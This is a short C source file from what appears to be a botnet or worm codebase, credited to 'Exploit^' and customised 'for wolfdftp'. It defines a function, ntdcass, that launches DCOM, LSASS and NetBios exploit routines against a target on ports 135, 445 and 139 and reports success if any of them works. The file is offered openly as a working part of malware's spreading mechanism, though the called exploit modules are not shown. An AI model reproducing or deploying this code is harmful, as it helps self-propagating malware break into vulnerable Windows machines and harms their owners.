//ntdcass original code by Exploit^//
//costumized for wolfdftp by yours truelly (silicon-wolf you bitches)
//changed so it'll work on this source....

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_LSASS
#ifndef NO_DCOM
#ifndef NO_NETBIOS
#ifndef NO_NTDCASS

BOOL ntdcass(EXINFO exinfo)
{
	exinfo.port = 135;
	BOOL bDCOM = dcom2(exinfo);
	exinfo.port = 445;
	BOOL bLSASS = lsass(exinfo);
	exinfo.port = 139;
	BOOL bNETBIOS = NetBios(exinfo);

	return bDCOM || bLSASS || bNETBIOS ? TRUE : FALSE;
}
#endif
#endif
#endif
#endif